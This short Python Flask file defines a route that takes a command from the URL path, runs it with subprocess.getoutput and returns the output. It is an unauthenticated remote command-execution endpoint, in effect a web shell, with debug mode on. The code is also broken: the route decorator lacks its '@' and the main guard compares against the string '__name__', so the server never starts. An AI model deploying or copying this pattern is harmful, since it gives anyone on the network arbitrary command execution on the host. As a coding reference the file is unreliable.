# coding:utf-8

from flask import Flask, jsonify
import subprocess


app=Flask(__name__)

class Config(object):
    DEBUG = True

    HOST = '0.0.0.0'
    PORT = 12122

app.config.from_object(Config)

app.route('/data/<cmd>/')
def index(cmd):
    data=subprocess.getoutput(cmd)
    return jsonify(data)


if __name__ == '__name__':
    app.run()